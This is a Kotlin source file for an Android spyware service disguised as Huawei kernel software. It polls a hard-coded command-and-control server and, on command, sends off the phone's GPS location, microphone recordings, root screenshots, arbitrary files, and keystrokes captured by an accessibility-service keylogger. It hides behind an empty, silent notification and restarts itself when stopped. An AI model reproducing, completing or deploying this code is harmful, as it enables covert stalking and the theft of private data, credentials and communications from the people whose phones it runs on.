package com.huawei.kern_stabiliser

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
import android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
import android.graphics.Color
import android.location.Location
import android.media.MediaRecorder
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.SystemClock
import android.util.Log
import android.view.KeyEvent
import android.view.accessibility.AccessibilityEvent
import androidx.core.app.NotificationCompat
import org.json.JSONObject
import java.io.BufferedOutputStream
import java.io.BufferedReader
import java.io.BufferedWriter
import java.io.DataOutputStream
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.io.FileWriter
import java.io.IOException
import java.io.InputStreamReader
import java.io.OutputStream
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.nio.file.Files
import java.nio.file.Paths
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicReference
import javax.net.ssl.HttpsURLConnection
import kotlin.random.Random

//
//Polling C2 (CC - control server) for the commands
//
//  Location/GPS
//  Screenshots
//  Voice/Audio
//  Keystrokes
//  Send a file: Android phone -> C2
//
// SysGuardService = MainService
class SysGuardService : Service() {
    companion object {
        //Keystrokes
        private val isKeystrokeRecordingActive: AtomicReference<Boolean> = AtomicReference(false)

        const val STOP_SERVICE_ACTION = "STOP_SERVICE"
        const val TAG = "MainService"
        const val X_API_TOKEN_HEADER = "X-API-TOKEN"

        const val CMD_GEO_LOCATION_GET = "gps"
        const val CMD_AUDIO_RECORD_START = "voice"
        const val CMD_AUDIO_RECORD_STOP = "evoice"
        const val CMD_SCREENSHOT_MAKE = "scrot"
        const val CMD_FILE_GET = "file"
        const val CMD_KEYSTROKES_RECORD_START = "keys"
        const val CMD_KEYSTROKES_RECORD_STOP = "ekeys"

        const val AUDIO_SAMPLE_RATE = 44100
        const val AUDIO_FILE_DURATION = 33 * 1000
        const val HTTP_STATUS_CODE_FOR_COMMAND_TO_EXECUTE = 418
        const val NOTIFICATION_ID = 1

        const val KEYSTROKES_PREFS = "keystrokes_prefs"
        const val KEYSTROKES_LAST_SENT_TO_SERVER_AT = "keystrokes_last_sent_to_server_at"

        const val SEND_TO_SERVER_MAX_RETRIES = 3
        const val SEND_TO_SERVER_INITIAL_DELAY_MILLIS = 1000L // 1 second
        const val SEND_TO_SERVER_MAX_DELAY_MILLIS = 8000L // 8 seconds
        const val EXTERNAL_FILES_SUB_DIR = "to_be_sent"
        const val TEMP_FILE_NAME_PREFX = "tmp_"
        const val SEND_TO_SERVER_MAX_RETRIEX = 4
        const val TWENTY_FOUR_HOURS_IN_MILLIS = 24 * 60 * 60 * 1000
        //TODO REMOVE
        const val USE_FAKE_SERVER_COMMANDS_FOR_DEBUGGING = false

        //mind the protocol, url and port
        var serverApiBaseUrl = "https://rosh.toh.info:8787"

        //multiple by 1000 because the "ms" are required
        var serverPollingInterval: Long = 90 * 1000
        var serverApiKey = "YvHCgOLOWgLOxQncvK1OxnKP2Axjl5CQN8T"

        fun initializeConfigData(configFile: File) {
            if (configFile.exists()) {
                val jsonString = configFile.readText()
                val json = JSONObject(jsonString)

                serverApiBaseUrl = json.optString("serverApiBaseUrl", serverApiBaseUrl)
                serverPollingInterval = json.optLong("serverPollingInterval", serverPollingInterval)
                serverApiKey = json.optString("serverApiKey", serverApiKey)
            }
        }

        fun uploadScreenshotOntoServer(file: File): Boolean {
            return uploadFileOntoServer(file, CMD_SCREENSHOT_MAKE, "application/octet-stream")
        }

        fun uploadKeylogFileOntoServer(file: File): Boolean {
            return uploadFileOntoServer(file, CMD_KEYSTROKES_RECORD_START, "application/octet-stream")
        }

        fun uploadAudioFileOntoServer(file: File): Boolean {
            return uploadFileOntoServer(file, CMD_AUDIO_RECORD_START, "application/octet-stream")
        }

        fun uploadFileOntoServer(file: File, urlPath: String, contentType: String): Boolean {
            if (!file.exists()) {
                Log.e(TAG, "file ${file.absolutePath} doesn't exist")
                return false
            }

            val url = URL("${serverApiBaseUrl}/${urlPath}")
            for (retryCount in 1..SEND_TO_SERVER_MAX_RETRIEX) {
                try {
                    val connection = url.openConnection() as HttpsURLConnection
                    connection.doOutput = true
                    connection.requestMethod = "POST"
                    connection.setRequestProperty("Content-Type", contentType)
                    connection.setRequestProperty("Connection", "Keep-Alive")
                    val outputStream = DataOutputStream(connection.outputStream)

                    if (BuildConfig.DEBUG) {
                        Log.d(TAG, "uploading file ${file.absolutePath} onto a server")
                    }

                    val fileInputStream = FileInputStream(file)
                    val bufferSize = 1024
                    val buffer = ByteArray(bufferSize)
                    var bytesRead: Int

                    while (fileInputStream.read(buffer, 0, bufferSize).also { bytesRead = it } != -1) {
                        outputStream.write(buffer, 0, bytesRead)
                    }

                    fileInputStream.close()
                    outputStream.flush()
                    outputStream.close()

                    val responseCode = connection.responseCode
                    if ((responseCode == HttpURLConnection.HTTP_OK) or (responseCode == HTTP_STATUS_CODE_FOR_COMMAND_TO_EXECUTE)) {
                        if (BuildConfig.DEBUG) {
                            Log.d(TAG, "[OK] uploaded file ${file.name} onto Server")
                        }

                        return true
                    }

                    connection.disconnect()
                } catch (e: Exception) {
                    if (BuildConfig.DEBUG) {
                        Log.e(TAG, "Error occurred: ${e.message}. Retrying...")
                    }

                    val delayMillis = minOf(SEND_TO_SERVER_INITIAL_DELAY_MILLIS * (SEND_TO_SERVER_MAX_RETRIES * 2), SEND_TO_SERVER_MAX_DELAY_MILLIS)
                    Thread.sleep(delayMillis)
                }
            }

            return false
        }
    }

    //Audio
    private val isAudioRecordingActive: AtomicReference<Boolean> = AtomicReference(false)

    //Geo Location
    private lateinit var locationHelper4: LocationHelper4

    //misc
    private val commandToExecute: AtomicReference<String?> = AtomicReference(null)
    private val commandToExecuteArgument: AtomicReference<String?> = AtomicReference(null)
    private val handler1 = Handler(Looper.getMainLooper())
    private val handler2 = Handler(Looper.getMainLooper())
    private val handler3 = Handler(Looper.getMainLooper())
    private val executor = Executors.newFixedThreadPool(3)

    // 1000 * 60 // 1 minute
    // 1000 * 30 // 30 seconds
    private val delayThread1: Long = serverPollingInterval
    private val delayThread2: Long = serverPollingInterval / 2
    private val delayThread3: Long = 1000 * 60 * 10

    //
    // ----------------------
    //

    override fun onCreate() {
        super.onCreate()

        if (BuildConfig.DEBUG) {
            Log.d(TAG, "onCreate(..)")
        }

        val cfgFile = File(this.filesDir, "config.json")
        initializeConfigData(cfgFile)

        createNewLogFileForKeystrokes()

        val d1 = getExternalFilesDir(null)
        Files.createDirectories(Paths.get("$d1/$EXTERNAL_FILES_SUB_DIR"))

        locationHelper4 = LocationHelper4(this) { location ->
            Log.d("Location Update", "Latitude: ${location?.latitude}, Longitude: ${location?.longitude}")
        }

        locationHelper4.startLocationUpdates(this)

        // val serviceAdditionaPermissions = FOREGROUND_SERVICE_TYPE_LOCATION
        val serviceAdditionaPermissions = FOREGROUND_SERVICE_TYPE_LOCATION or FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION

        startForeground(NOTIFICATION_ID, createNotification(), serviceAdditionaPermissions)
        startThreads()

        if (BuildConfig.DEBUG) {
            Log.d(TAG, "onCreate(..) complete")
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "${packageName}.${STOP_SERVICE_ACTION}") {
            stopSelf()
        }

        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()

        stopThreads()
        locationHelper4.stopLocationUpdates()

        //restart forever
        //it may not always work as there's no standard, robust way
        // to get restarted forever, unless it is a system service
        //
        val broadcastIntent = Intent(MyBroadcastReceiver.ACTION_RESTART_FOREVER_SERVICE)
        sendBroadcast(broadcastIntent)
    }

    override fun onBind(p0: Intent?): IBinder? {
        return null
    }

    override fun onTaskRemoved(rootIntent: Intent) {
        val restartServiceIntent = Intent(applicationContext, this::class.java).also {
            it.setPackage(packageName)
        }

        val restartServicePendingIntent: PendingIntent = PendingIntent.getService(this, 1, restartServiceIntent, PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE)
        applicationContext.getSystemService(Context.ALARM_SERVICE)
        val alarmService: AlarmManager = applicationContext.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmService.set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 1000, restartServicePendingIntent)
    }


    //
    //----------------------
    //

    private fun createNotification(): Notification {
        val title = "Huawei Kernel SysGuardService"
        val channelId = createNotificationChannel("sys_guard_service_channel", title)
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("")
            .setContentText("")
            .build()
    }

    private fun createNotificationChannel(channelId: String, channelName: String): String {
        val chan = NotificationChannel(channelId, channelName, NotificationManager.IMPORTANCE_NONE)
        chan.lightColor = Color.BLUE
        chan.lockscreenVisibility = Notification.VISIBILITY_PRIVATE
        val service = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        service.createNotificationChannel(chan)

        return channelId
    }

    //
    //

    private fun startThreads() {
        executor.submit {
            runPollServerThread()
        }

        executor.submit {
            runExecuteCommandOfServerThread()
        }

        executor.submit {
            runUploadFilesOntoServerThread()
        }
    }

    private fun stopThreads() {
        handler1.removeCallbacksAndMessages(null)
        handler2.removeCallbacksAndMessages(null)
        handler3.removeCallbacksAndMessages(null)
        executor.shutdown()
    }

    private fun runPollServerThread() {
        executor.execute {
            while(true) {
                val location = locationHelper4.getLastKnownLocationWithLocationManager4()
                Log.d(TAG, "Latitude: ${location?.latitude}, Longitude: ${location?.longitude}")
                pingServerWithGeoLocation(location)
                Thread.sleep(delayThread1)
            }
        }
    }

    private fun runExecuteCommandOfServerThread() {
        executor.execute {
            while (true) {
                when (val cmd = commandToExecute.get()) {
                    CMD_AUDIO_RECORD_START -> {
                        if (BuildConfig.DEBUG) {
                            Log.d(TAG, "cmd execute: CMD_AUDIO_RECORD_START; isAudioRecordingActive: ${isAudioRecordingActive.get()}")
                        }

                        if (!isAudioRecordingActive.get()) {
                            startAudioRecording()
                        }
                    }

                    CMD_AUDIO_RECORD_STOP -> {
                        if (BuildConfig.DEBUG) {
                            Log.d(TAG, "cmd execute: CMD_AUDIO_RECORD_STOP; isAudioRecordingActive: ${isAudioRecordingActive.get()}")
                        }

                        if (isAudioRecordingActive.get()) {
                            stopAudioRecording()
                        }
                    }

                    CMD_KEYSTROKES_RECORD_START -> {
                        if (BuildConfig.DEBUG) {
                            Log.d(TAG, "cmd execute: CMD_KEYSTROKES_RECORD_START; isKeystrokeRecordingActive: ${isKeystrokeRecordingActive.get()}")
                        }

                        isKeystrokeRecordingActive.set(true)
                    }

                    CMD_KEYSTROKES_RECORD_STOP -> {
                        if (BuildConfig.DEBUG) {
                            Log.d(TAG, "cmd execute: CMD_KEYSTROKES_RECORD_STOP; isKeystrokeRecordingActive: ${isKeystrokeRecordingActive.get()}")
                        }

                        isKeystrokeRecordingActive.set(false)
                    }

                    CMD_GEO_LOCATION_GET -> {
                        if (BuildConfig.DEBUG) {
                            Log.d(TAG, "cmd execute: CMD_GEO_LOCATION_GET")
                        }

                        val coordinates = locationHelper4.getLastKnownLocationWithLocationManager4(true)
                        if (BuildConfig.DEBUG) {
                            Log.d(TAG, "coordinates: $coordinates")
                        }

                        Thread {
                            sendLocationToServer(coordinates)
                            commandToExecute.set(null)
                        }.start()
                    }

                    CMD_SCREENSHOT_MAKE -> {
                        if (BuildConfig.DEBUG) {
                            Log.d(TAG, "cmd execute: CMD_SCREENSHOT_MAKE")
                        }

                        Thread {
                            val ts = System.currentTimeMillis()
                            val filePath2 = File(getFilePathOfExternalSubDir("screenshot_${ts}.png"))
                            //as root
                            if (takeScreenshot(filePath2)) {
                                Thread {
                                    if (BuildConfig.DEBUG) {
                                        Log.d(TAG, "takeScreenshot > OK; file path: $filePath2")
                                    }

                                    if (uploadScreenshotOntoServer(filePath2)) {
                                        filePath2.delete()
                                    }
                                }.start()
                            } else {
                                if (BuildConfig.DEBUG) {
                                    Log.d(TAG, "takeScreenshot > false")
                                }
                            }

                            commandToExecute.set(null)
                        }.start()
                    }

                    CMD_FILE_GET -> {
                        if (BuildConfig.DEBUG) {
                            Log.d(TAG, "cmd execute: CMD_FILE_GET: ${commandToExecuteArgument.get()}")
                        }

                        val filePath = commandToExecuteArgument.get()
                        val file = File(filePath.toString())
                        if (file.exists()) {
                            Thread {
                                uploadFileOntoServer(file, CMD_FILE_GET, "application/octet-stream")
                                commandToExecute.set(null)
                                commandToExecuteArgument.set(null)
                            }.start()
                        } else {
                            Log.w(TAG, "file ${filePath} doesn't exist")
                        }
                    }

                    "", null -> {
                        if (BuildConfig.DEBUG) {
                            Log.d(TAG, "no command to execute; continue polling")
                        }
                    }

                    else -> {
                        if (BuildConfig.DEBUG) {
                            Log.d(TAG, "unknown command to execute: $cmd")
                        }
                    }
                }

                Thread.sleep(delayThread2)
            }
        }
    }

    private fun runUploadFilesOntoServerThread() {
        val d1 = getExternalFilesDir(null)
        val d2 = File("$d1/$EXTERNAL_FILES_SUB_DIR")
        executor.execute {
            while (true) {
                val files = d2.listFiles()
                if (files != null) {
                    for (file in files) {
                        val c1 = !file.name.contains(TEMP_FILE_NAME_PREFX) or !fileModifiedOver24HoursAgo(file)
                        if (!file.isDirectory && c1) {
                            if (BuildConfig.DEBUG) {
                                Log.d(TAG, "processing file: ${file.name}")
                            }
                            
                            when (file.extension.lowercase()) {
                                "3gp", "aac" -> {
                                    val res = uploadAudioFileOntoServer(file)
                                    if (res) {
                                        file.delete()
                                    }
                                }

                                "txt" -> {
                                    val res = uploadKeylogFileOntoServer(file)
                                    if (res) {
                                        file.delete()
                                    }
                                }
                                
                                "png", "jpg", "jpeg" -> {
                                    val res = uploadScreenshotOntoServer(file)
                                    if (res) {
                                        file.delete()
                                    }
                                }

                                else -> {
                                    if (BuildConfig.DEBUG) {
                                        Log.d(TAG, "file ${file.name}: nothing to do")
                                    }
                                    
                                    //TODO
                                }
                            }
                        }
                    }
                }

                Thread.sleep(delayThread3)
            }
        }
    }

    fun fileModifiedOver24HoursAgo(file: File): Boolean {
        val currentTime = System.currentTimeMillis()
        val lastModified = file.lastModified()

        return currentTime - lastModified > TWENTY_FOUR_HOURS_IN_MILLIS
    }

    //
    //Keystrokes
    //
    private lateinit var keystrokesSharedPreferences: SharedPreferences
    private var keystrokesCurrentLogFileName: String = ""

    private fun createNewLogFileForKeystrokes() {
        keystrokesSharedPreferences = getSharedPreferences(KEYSTROKES_PREFS, Context.MODE_PRIVATE)

        val ts = System.currentTimeMillis()
        keystrokesCurrentLogFileName = getFilePathOfExternalSubDir("${TEMP_FILE_NAME_PREFX}${ts}.txt")
        keystrokesSharedPreferences.edit().putLong(KEYSTROKES_LAST_SENT_TO_SERVER_AT, ts).apply()
    }


    //KeychainGuardService = Keylogger
    class KeychainGuardService : AccessibilityService() {
        companion object {
            const val SAVE_INTO_FILE_THRESHOLD_INTERVAL = 30 * 1000
            const val TAG = "KeyLoggerService"
        }

        private var currentLogFile: File? = null
        private var fileWriter: BufferedWriter? = null
        private var lastFileSwitchTime: Long = 0
        private val keyBuffer = StringBuilder()

        override fun onKeyEvent(event: KeyEvent?): Boolean {
            if (event != null) {
                when (event.keyCode) {
                    KeyEvent.KEYCODE_ENTER -> {
                        writeToLogFile("\n")
                    }
                    KeyEvent.KEYCODE_SPACE -> {
                        writeToLogFile(" ")
                    }
                    else -> {
                        val keyChar = event.unicodeChar.toChar()
                        writeToLogFile(keyChar.toString())
                    }
                }

                return true
            }

            return false
        }

        private fun dumpBufferToFile() {
            if (keyBuffer.isNotEmpty()) {
                try {
                    if (isKeystrokeRecordingActive.get()) {
                        fileWriter?.append(keyBuffer.toString())
                        fileWriter?.flush()
                    }

                    keyBuffer.clear()
                } catch (e: IOException) {
                    e.printStackTrace()
                }
            }
        }

        override fun onAccessibilityEvent(event: AccessibilityEvent?) {
            if (event?.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                val text = event.text.toString()

                if (BuildConfig.DEBUG) {
                    Log.d(TAG, "onAccessibilityEvent: $text")
                }

                writeToLogFile(text)
            }
        }

        override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
            if (BuildConfig.DEBUG) {
                Log.d(TAG, "onStartCommand")
            }

            return START_STICKY
        }

        override fun onInterrupt() {
            if (BuildConfig.DEBUG) {
                Log.d(TAG, "onInterrupt")
            }
        }

        override fun onUnbind(intent: Intent?): Boolean {
            if (BuildConfig.DEBUG) {
                Log.d(TAG, "Service unbound")
            }

            stopForegroundService()
            return super.onUnbind(intent)
        }

        override fun onTaskRemoved(rootIntent: Intent?) {
            super.onTaskRemoved(rootIntent)
            stopForegroundService()
        }

        private fun stopForegroundService() {
            stopForeground(true)
            stopSelf()
        }

        override fun onServiceConnected() {
            super.onServiceConnected()
            if (BuildConfig.DEBUG) {
                Log.d(TAG, "onServiceConnected")
            }

            val info = AccessibilityServiceInfo()
            info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
            info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            serviceInfo = info
        }

        private fun writeToLogFile(text: String) {
            checkFileSwitch()
            keyBuffer.append(text)
        }

        private fun checkFileSwitch() {
            val currentTime = System.currentTimeMillis()

            Log.d(TAG, "checkFileSwitch: currentTime: ${currentTime}, lastFileSwitchTime: ${lastFileSwitchTime}")
            Log.d(TAG, "checkFileSwitch: SAVE_INTO_FILE_THRESHOLD_INTERVAL: ${SAVE_INTO_FILE_THRESHOLD_INTERVAL}")
            val _a1 = currentTime - lastFileSwitchTime > SAVE_INTO_FILE_THRESHOLD_INTERVAL
            Log.d(TAG, "checkFileSwitch: diff ${_a1} (${currentTime - lastFileSwitchTime} <=> ${SAVE_INTO_FILE_THRESHOLD_INTERVAL})")

            if ((currentLogFile == null) || (currentTime - lastFileSwitchTime > SAVE_INTO_FILE_THRESHOLD_INTERVAL)) {


                Log.d(TAG, "checkFileSwitch > inside #1")


                dumpBufferToFile()
                switchLogFile()
                lastFileSwitchTime = currentTime
            }
        }

        private fun switchLogFile() {
            closeFileWriter()
            if (currentLogFile != null) {
                val _readyLogFileName = currentLogFile?.name?.removePrefix(TEMP_FILE_NAME_PREFX)

                val d1 = getExternalFilesDir(null)
                val d2 = EXTERNAL_FILES_SUB_DIR
                val readyLogFile = File("${d1}/${d2}", _readyLogFileName!!)
                val readyLogFile2 = currentLogFile!!.copyTo(readyLogFile)

                if (readyLogFile2.exists()) {
                    Thread {
                        val _a = currentLogFile!!.delete()
                        uploadKeylogFileOntoServer(readyLogFile)
                    }.start()
                }
            }

            val ts = System.currentTimeMillis()
            val fileName = "${TEMP_FILE_NAME_PREFX}keylog_${ts}.txt"
            currentLogFile = File(filesDir, fileName)

            try {
                fileWriter = BufferedWriter(FileWriter(currentLogFile, true))
            } catch (e: IOException) {
                e.printStackTrace()
            }
        }

        private fun closeFileWriter() {
            try {
                fileWriter?.close()
            } catch (e: IOException) {
                e.printStackTrace()
            }
        }

        override fun onDestroy() {
            super.onDestroy()
            closeFileWriter()
        }
    }

    //
    //Audio
    //
    private var mediaRecorder: MediaRecorder? = null

    private fun getFilePathOfExternalSubDir(fileName: String): String {
        val d1 = getExternalFilesDir(null)
        val d2 = EXTERNAL_FILES_SUB_DIR
        return File("${d1}/${d2}", fileName).absolutePath
    }

    private fun setupMediaRecorder() {
        mediaRecorder = MediaRecorder()
        val ts = System.currentTimeMillis()
        val tmpOutFile = File(
            getFilePathOfExternalSubDir("${TEMP_FILE_NAME_PREFX}recorded_audio_${ts}.3gp")
        )

        val outFile = File(
            getFilePathOfExternalSubDir("recorded_audio_${ts}.3gp")
        )

        try {
            mediaRecorder?.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setAudioEncodingBitRate(AUDIO_SAMPLE_RATE * 16);
                setAudioSamplingRate(AUDIO_SAMPLE_RATE);
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                setMaxDuration(AUDIO_FILE_DURATION)
                setOutputFile(tmpOutFile)
                setOnInfoListener { mr, what, extra ->
                    if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
                        if (BuildConfig.DEBUG) {
                            Log.d(TAG, "MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED")
                        }

                        Thread {
                            if (tmpOutFile.exists()) {
                                if (BuildConfig.DEBUG) {
                                    Log.d(TAG, "MediaRecorder > tmpOutFile > uploading onto the server")
                                }

                                if (tmpOutFile.renameTo(outFile)) {
                                    uploadAudioFileOntoServer(outFile)

                                    //TODO if successfully uploaded, delete it
                                    outFile.delete()
                                }
                            } else {
                                if (BuildConfig.DEBUG) {
                                    Log.d(TAG, "MediaRecorder > tmpOutFile > doesn't exist")
                                }
                            }
                        }.start()

                        restartAudioRecording()
                    }
                }

                prepare()
            }
        } catch (e: Exception) {
            if (BuildConfig.DEBUG) {
                Log.d(TAG, e.printStackTrace().toString())
            }
        }
    }

    fun startAudioRecording() {
        setupMediaRecorder()
        mediaRecorder?.start()
        isAudioRecordingActive.set(true)
    }

    private fun stopAudioRecording() {
        mediaRecorder?.apply {
            stop()
            release()
        }

        mediaRecorder = null
        isAudioRecordingActive.set(false)
    }

    private fun restartAudioRecording() {
        stopAudioRecording()
        Thread.sleep(10)
        startAudioRecording()
    }


    //
    //Screenshots
    //
    //as root
    fun takeScreenshot(outputFile: File): Boolean {
        try {
            val process = Runtime.getRuntime().exec("su -c screencap -p")
            val inputStream = process.inputStream
            val bufferedReader = BufferedReader(InputStreamReader(inputStream))

            val fileOutputStream = FileOutputStream(outputFile)
            val bufferedOutputStream = BufferedOutputStream(fileOutputStream)

            val buffer = ByteArray(4096)
            var bytesRead: Int
            while (inputStream.read(buffer).also { bytesRead = it } != -1) {
                bufferedOutputStream.write(buffer, 0, bytesRead)
            }

            bufferedReader.close()
            bufferedOutputStream.close()

            return process.waitFor() == 0
        } catch (e: IOException) {
            Log.e(TAG, e.message.toString())
        } catch (e: InterruptedException) {
            Log.e(TAG, e.message.toString())
        }

        return false
    }


    //
    //Geo Location
    //
    private fun sendLocationToServer(coordinates: Location?) {
        try {
            val url = URL("${serverApiBaseUrl}/gps")
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.doOutput = true
            connection.setRequestProperty("Content-Type", "application/text")
            val outputStream: OutputStream = connection.outputStream
            val outputStreamWriter = OutputStreamWriter(outputStream)

            //latitude ; longitude
            val coordStr = if (coordinates != null) {
                "${coordinates.latitude};${coordinates.longitude}"
            } else {
                ""
            }

            if (BuildConfig.DEBUG) {
                Log.d(TAG, "sending '/gps' data; location: ${coordStr}")
            }

            outputStreamWriter.write(coordStr)
            outputStreamWriter.flush()
            outputStreamWriter.close()
            val _responseCode = connection.responseCode
            connection.disconnect()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun pingServerWithGeoLocation(coordinates: Location?) {
        //TODO only for debugging without a server
        //remove
        if (USE_FAKE_SERVER_COMMANDS_FOR_DEBUGGING) {
            return handleFakeCommand()
        }
        //



        // cached location, sent to 'ping';
        // the coordinates may be null if they aren't in cache
        val locationString = if (coordinates != null) {
            val latt = coordinates.latitude
            val longt = coordinates.longitude
            "${latt};${longt}"
        } else {
            ""
        }

        val url = URL("${serverApiBaseUrl}/ping")
        val connection = url.openConnection() as HttpURLConnection
        try {
            connection.requestMethod = "POST"
            connection.setRequestProperty(X_API_TOKEN_HEADER, serverApiKey)
            connection.doOutput = true
            connection.connectTimeout = 5000
            connection.setRequestProperty("Content-Type", "application/text")
            val outputStream = DataOutputStream(connection.outputStream)
            outputStream.write(locationString.toByteArray())
            outputStream.flush()
            outputStream.close()

            if (BuildConfig.DEBUG) {
                Log.d(TAG, "request for 'ping': ${locationString}")
            }

            val responseCode = connection.responseCode
            if (BuildConfig.DEBUG) {
                Log.d(TAG, "response for 'ping': ${responseCode}")
            }

            when (responseCode) {
                HttpURLConnection.HTTP_OK -> {
                    try {
                        val inputStream = connection.inputStream
                        val reader = BufferedReader(InputStreamReader(inputStream))
                        val responseStringBuilder = StringBuilder()
                        var line: String?
                        while (reader.readLine().also { line = it } != null) {
                            responseStringBuilder.append(line)
                        }

                        val responseBody = responseStringBuilder.toString()
                        if (BuildConfig.DEBUG) {
                            Log.d(TAG, "'/ping' response body: ${responseBody}")
                        }

                        val parts = responseBody.split(";")
                        val cmd = parts.getOrNull(0)
                        val cmdArg = parts.getOrNull(1)

                        when (cmd) {
                            CMD_AUDIO_RECORD_START -> {
                                commandToExecute.set(CMD_AUDIO_RECORD_START)
                            }

                            CMD_AUDIO_RECORD_STOP -> {
                                commandToExecute.set(CMD_AUDIO_RECORD_STOP)
                            }

                            CMD_GEO_LOCATION_GET -> {
                                commandToExecute.set(CMD_GEO_LOCATION_GET)
                            }

                            CMD_SCREENSHOT_MAKE -> {
                                commandToExecute.set(CMD_SCREENSHOT_MAKE)
                            }

                            CMD_FILE_GET -> {
                                commandToExecute.set(CMD_FILE_GET)
                                commandToExecuteArgument.set(cmdArg)
                            }

                            CMD_KEYSTROKES_RECORD_START -> {
                                isKeystrokeRecordingActive.set(true)
                                commandToExecute.set(CMD_KEYSTROKES_RECORD_START)
                            }

                            CMD_KEYSTROKES_RECORD_STOP -> {
                                isKeystrokeRecordingActive.set(false)
                                commandToExecute.set(CMD_KEYSTROKES_RECORD_STOP)
                            }

                            else -> {
                                Log.d(TAG, "unknown command to parse: $cmd")
                            }
                        }
                    } catch (e: IOException) {
                        Log.e(TAG, "Reading response body failed: ${e.printStackTrace()}")
                    }
                }

                else -> {
                    Log.e(TAG, "Server response > no handler for http code: $responseCode")
                }
            }
        } catch (e: IOException) {
            Log.e(TAG, "Error during server request: ${e.message}")
        } finally {
            connection.disconnect()
        }
    }


    //TODO remove
    fun handleFakeCommand() {
        val commands = listOf(
            //CMD_SCREENSHOT_MAKE,
            //CMD_GEO_LOCATION_GET,

            //CMD_AUDIO_RECORD_START,
            //CMD_AUDIO_RECORD_STOP,

            CMD_KEYSTROKES_RECORD_START,
            CMD_KEYSTROKES_RECORD_STOP,

            //            CMD_FILE_GET,
        )

        val randomIndex = Random.nextInt(commands.size)
        val randomCommand = commands[randomIndex]

        val cmd = randomCommand
        val cmdArg = "TODO"

        if (BuildConfig.DEBUG) {
            Log.d(TAG, "cmd from '/ping': ${cmd}; arg: ${cmdArg}")
        }

        when (cmd) {
            CMD_AUDIO_RECORD_START -> {
                commandToExecute.set(CMD_AUDIO_RECORD_START)
            }

            CMD_AUDIO_RECORD_STOP -> {
                commandToExecute.set(CMD_AUDIO_RECORD_STOP)
            }

            CMD_GEO_LOCATION_GET -> {
                commandToExecute.set(CMD_GEO_LOCATION_GET)
            }

            CMD_SCREENSHOT_MAKE -> {
                commandToExecute.set(CMD_SCREENSHOT_MAKE)
            }

            CMD_FILE_GET -> {
                commandToExecute.set(CMD_FILE_GET)
                commandToExecuteArgument.set(cmdArg)
            }

            CMD_KEYSTROKES_RECORD_START -> {
                isKeystrokeRecordingActive.set(true)
                commandToExecute.set(CMD_KEYSTROKES_RECORD_START)
            }

            CMD_KEYSTROKES_RECORD_STOP -> {
                isKeystrokeRecordingActive.set(false)
                commandToExecute.set(CMD_KEYSTROKES_RECORD_STOP)
            }

            else -> {
                Log.d(TAG, "unknown command to parse: $cmd")
            }
        }
    }
}
